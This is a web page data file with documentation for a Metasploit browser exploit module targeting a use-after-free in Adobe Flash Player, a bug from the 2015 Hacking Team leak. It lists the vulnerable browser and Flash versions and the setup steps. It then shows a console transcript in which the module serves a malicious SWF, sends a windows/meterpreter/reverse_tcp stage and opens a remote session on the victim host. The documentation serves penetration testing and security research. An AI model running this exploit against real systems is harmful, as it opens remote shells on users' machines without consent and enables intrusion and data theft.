{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/browser/adobe_flash_hacking_team_uaf","result":{"data":{"moduleMetadataJson":{"id":"293240a7-8c42-50d0-b7ae-e03f327d10d5","name":"Adobe Flash Player ByteArray Use After Free","fullname":"exploit/multi/browser/adobe_flash_hacking_team_uaf","description":"This module exploits an use after free on Adobe Flash Player. The vulnerability,\n        discovered by Hacking Team and made public as part of the July 2015 data leak, was\n        described as an Use After Free while handling ByteArray objects. This module has\n        been tested successfully on:\n\n        Windows 7 SP1 (32-bit), IE11 and Adobe Flash 18.0.0.194,\n        Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 18.0.0.194,\n        Windows 8.1 (32-bit), IE11 and Adobe Flash 18.0.0.194,\n        Windows 8.1 (32-bit), Firefox and Adobe Flash 18.0.0.194, and\n        Linux Mint \"Rebecca\" (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.468.","rank":500,"fields":{"detailsSlug":"/modules/details/exploit/multi/browser/adobe_flash_hacking_team_uaf","documentationSlug":"/modules/documentation/exploit/multi/browser/adobe_flash_hacking_team_uaf","referencesSlug":"/modules/references/exploit/multi/browser/adobe_flash_hacking_team_uaf"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits an use after free on Adobe Flash Player. The vulnerability, discovered by Hacking Team and made public as part of the July 2015 data leak, was described as an Use After Free while handling ByteArray objects. This module has been tested successfully on:</p>\n<ol>\n<li>Windows 7 SP1 (32-bit), IE11 and Adobe Flash 18.0.0.194.</li>\n<li>Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 18.0.0.194.</li>\n<li>Windows 8.1 (32-bit), IE11 and Adobe Flash 18.0.0.194.</li>\n<li>Windows 8.1 (32-bit), Firefox and Adobe Flash 18.0.0.194.</li>\n<li>Linux Mint \"Rebecca\" (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.468.</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Do: <code class=\"language-text\">use exploit/multi/browser/adobe_flash_hacking_team_uaf</code></li>\n<li>Do: <code class=\"language-text\">set payload windows/meterpreter/reverse_tcp</code></li>\n<li>Do: <code class=\"language-text\">set LHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">set SRVHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">set URIPATH / [PATH]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ie-11-and-flash-1800194\" style=\"position:relative;\"><a href=\"#ie-11-and-flash-1800194\" aria-label=\"ie 11 and flash 1800194 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IE 11 and Flash 18.0.0.194</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/browser/adobe_flash_hacking_team_uaf \nmsf exploit(adobe_flash_hacking_team_uaf) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(adobe_flash_hacking_team_uaf) &gt; set LHOST 172.16.178.160\nLHOST =&gt; 172.16.178.160\nmsf exploit(adobe_flash_hacking_team_uaf) &gt; set srvhost 172.16.178.80\nsrvhost =&gt; 172.16.178.80\nmsf exploit(adobe_flash_hacking_team_uaf) &gt; set SRVPORT 80\nSRVPORT =&gt; 80\nmsf exploit(adobe_flash_hacking_team_uaf) &gt; set URIPATH /\nURIPATH =&gt; /\nmsf exploit(adobe_flash_hacking_team_uaf) &gt; exploit\n[*] Exploit running as background job.\n\n[*] Started reverse TCP handler on 172.16.178.160:4444 \n[*] Using URL: http://0.0.0.0:80/\nmsf exploit(adobe_flash_hacking_team_uaf) &gt; [*] Local IP: http://127.0.0.1:80/\n[*] Server started.\n\nmsf exploit(adobe_flash_hacking_team_uaf) &gt; \n[*] 172.16.178.80   adobe_flash_hacking_team_uaf - Gathering target information.\n[*] 172.16.178.80   adobe_flash_hacking_team_uaf - Sending HTML response.\n[*] 172.16.178.80   adobe_flash_hacking_team_uaf - Request: /rGaaQS/\n[*] 172.16.178.80   adobe_flash_hacking_team_uaf - Sending HTML...\n[*] 172.16.178.80   adobe_flash_hacking_team_uaf - Request: /rGaaQS/AsvCG.swf\n[*] 172.16.178.80   adobe_flash_hacking_team_uaf - Sending SWF...\n[*] Sending stage (957999 bytes) to 172.16.178.80\n[*] Meterpreter session 1 opened (172.16.178.160:4444 -&gt; 172.16.178.80:49167) at 2017-03-26 22:51:29 +0900\n\nmsf exploit(adobe_flash_hacking_team_uaf) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; sysinfo\nComputer        : WIN7X64TJ7XH-PC\nOS              : Windows 7 (Build 7601, Service Pack 1).\nArchitecture    : x64 (Current Process is WOW64)\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/win32</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"293240a7-8c42-50d0-b7ae-e03f327d10d5"}}}